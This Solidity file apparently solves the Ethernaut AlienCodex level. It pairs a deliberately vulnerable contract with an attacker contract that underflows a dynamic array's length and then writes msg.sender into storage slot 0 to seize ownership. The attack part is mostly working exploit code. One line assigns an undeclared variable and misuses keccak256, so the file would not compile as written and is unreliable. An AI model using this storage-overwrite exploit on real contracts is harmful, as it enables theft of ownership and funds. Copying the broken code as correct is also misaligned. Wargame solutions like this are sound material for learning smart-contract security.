// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./Ownable-05.sol";

contract AlienCodex is Ownable {
    //slot 0 is the owner
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }
    //@audit can make contact and call the functiosn below, which allows for direct storage write
    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract AlienCodexAttacker {
    AlienCodex public target;

    constructor(AlienCodex _target) public {
        target = _target;
    }

    function attack() public {
        target.make_contact();
        //retracting it will change the length to below its limits and cause an overflow
        target.retract();
        dynamicArrayPosition = keccak256(1);
        uint256 ownerSlot = ((2 ** 256) - 1) -
            uint256(keccak256(abi.encode(1))) +
            1;

        bytes32 senderAddress = bytes32(uint256(uint160(msg.sender)));
        target.revise(ownerSlot, senderAddress);
    }
}
